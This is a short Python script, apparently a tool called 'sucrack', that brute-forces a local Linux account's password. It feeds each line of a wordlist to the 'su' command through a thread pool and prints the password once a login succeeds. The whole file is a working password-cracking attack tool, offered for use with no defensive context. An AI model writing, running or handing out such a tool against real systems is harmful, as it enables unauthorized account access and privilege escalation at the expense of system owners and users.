from concurrent.futures import ThreadPoolExecutor
from sys import argv
import subprocess

class PasswordCracker:
    def __init__(self, username, threads, wordlist):
        self.username = username
        self.threads = threads
        self.wordlist = wordlist
        self.password_cracked = False

    def check_login(self, password):
        try:
            process = subprocess.run(["su", self.username], input=password, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

            if process.returncode == 0:
                print(f"Password: {password}")
                self.password_cracked = True 
        except Exception as e:
            print(e)

    def process_passwords(self, passwords):
        for password in passwords:
            if self.password_cracked:
                break
            self.check_login(password)

    def run_cracker(self):
        with open(self.wordlist, "r", encoding="latin1") as file:
            passwords = file.read().splitlines()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            split_passwords = [passwords[i:i + self.threads] for i in range(0, len(passwords), self.threads)]
            executor.map(self.process_passwords, split_passwords)

if __name__ == "__main__":
    if len(argv) == 4:
        username = argv[1]
        threads = int(argv[2])
        wordlist = argv[3]
    else:
        print(f"Usage: python3 {argv[0]} [username] [threads] [wordlist]")
        exit(0)

    sucrack = PasswordCracker(username, threads, wordlist)
    sucrack.run_cracker()
